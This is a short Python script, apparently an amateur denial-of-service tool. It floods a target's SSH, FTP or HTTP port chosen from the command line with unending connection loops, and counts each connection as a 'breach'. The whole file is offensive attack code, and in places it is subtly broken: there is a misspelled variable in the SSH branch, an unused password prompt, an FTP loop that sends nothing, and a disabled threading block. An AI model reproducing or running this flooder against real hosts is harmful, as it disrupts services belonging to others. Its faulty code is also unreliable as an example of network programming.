import threading
import socket
import sys
import ftplib
from ssh2.session import Session
import os

args = sys.argv[1:]
TARGET = args[0]
PORT = int(args[1])
Breach_count = 0

def DOS_service(service):
    service = int(service)
    try:
        if service == 22:
            print('DOS-ing SSH = 22')
            DOS_attack_SSH()
        elif service == 21:
            print('DOS-ing FTP = 21')
            DOS_attack_FTP()
        else:
            print('DOS-ing HTTP = 80')
            DOS_attack_HTTP()
    except Exception as e:
        print(e)

def DOS_attack_HTTP():
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET, PORT))
            print(f'http connected on {TARGET} on PORT {PORT}')
            # HTTP exclusive msg sending
            s.sendto(("GET /" + TARGET + " HTTP/1.1\r\n").encode('ascii'), (TARGET, PORT))
            s.sendto(("Host: " + TARGET + "\r\n\r\n").encode('ascii'), (TARGET, PORT))

            global Breach_count
            Breach_count += 1
            print(Breach_count)

            s.close()
    except Exception as e:
        print(e)

def DOS_attack_SSH():
    host = TARGET
    password = input('enter password > ')
    usr = os.getlogin()
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET, PORT))
            print(f'ssh connected: {TARGER} on PORT {PORT}')
            # SSH exclusive msg sending
            session = Session()
            session.handshake(s)
            session.agent_auth(usr)

            # trying an ssh session
            try:
                channel = session.open_session()
                channel.execute('echo hello;')
                channel.close()
            except:
                pass

            global Breach_count
            Breach_count += 1
            print(Breach_count)

            s.close()
    except Exception as e:
        print(e)

def DOS_attack_FTP():
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET, PORT))
            print(f'FTP connected on {TARGET} on PORT {PORT}')
            # SSH exclusive msg sending
            

            global Breach_count
            Breach_count += 1
            print(Breach_count)

            s.close()
    except Exception as e:
        print(e)

# def main():
#     for i in range(2):
#         thread = threading.Thread(target=DOS_service, args=PORT)
#         thread.start()

# if importing this module
if __name__ == '__main__':
    DOS_service(PORT)